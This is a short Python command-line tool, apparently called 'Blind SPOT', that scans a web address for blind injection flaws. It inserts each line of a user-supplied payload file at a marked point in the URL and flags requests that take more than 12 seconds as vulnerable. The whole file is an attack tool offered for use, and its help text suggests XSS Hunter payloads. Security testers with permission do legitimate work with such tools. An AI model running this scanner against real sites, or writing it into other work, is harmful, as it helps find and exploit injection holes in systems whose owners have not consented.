############################
import requests        #####
import sys             #####
import argparse        #####
from colorama import *  #####
############################
###########
#LOGO AREA 
###########
logo = ''' __________.__  .__            .___   ______________________________________
\______   \  | |__| ____    __| _/  /   _____/\______   \_____  \__    ___/
 |    |  _/  | |  |/    \  / __ |   \_____  \  |     ___//   |   \|    |   
 |    |   \  |_|  |   |  \/ /_/ |   /        \ |    |   /    |    \    |   
 |______  /____/__|___|  /\____ |  /_______  / |____|   \_______  /____|   
        \/             \/      \/          \/                   \/        
                               @made by Zahir Tariq                        '''
        
print(logo)
print('\n \n')

#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
parser = argparse.ArgumentParser()
parser.add_argument("-u","--url",help="site URL", required=True)
parser.add_argument("-p","--payloads",help="Blind injection payload List You can also use xsshunterpayloads maybe there r xss ;)", required=True)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#

args = parser.parse_args()

######################
##Function Area [*]  #
######################

#(1) injection func
def inject(url,payloads):
    for payload in open(payloads,'r').readlines():
        uurl = url.replace('[*]', payload)
        request = requests.get(uurl)
        timeone = request.elapsed.seconds
        if timeone > 12:
            print(Style.BRIGHT + Fore.RED + "[!] blind injection detected ===>", uurl)
        else :
            print(Style.BRIGHT + Fore.GREEN + "Payload Not working :'( ==>", uurl)
            
#(2) check url 'live or not'
def verify(url):
        url_test = url.replace('[*]',"")
        req = requests.get(url_test)
        timetwo = req.elapsed.seconds
        if timetwo > 10:
            sys.exit(Style.BRIGHT + Fore.RED + '[!] The connect is not good to run the scanner or target is not up ')
        else:
            inject(args.url , args.payloads)
        
        
################
#ERROR AREA   ##
################
if not '[*]' in args.url:
    sys.exit(Style.BRIGHT + Fore.RED + "[!] Missing inject point , please add [*] in the inject point :D !!!!!!!")
else:
    verify(args.url)

            
































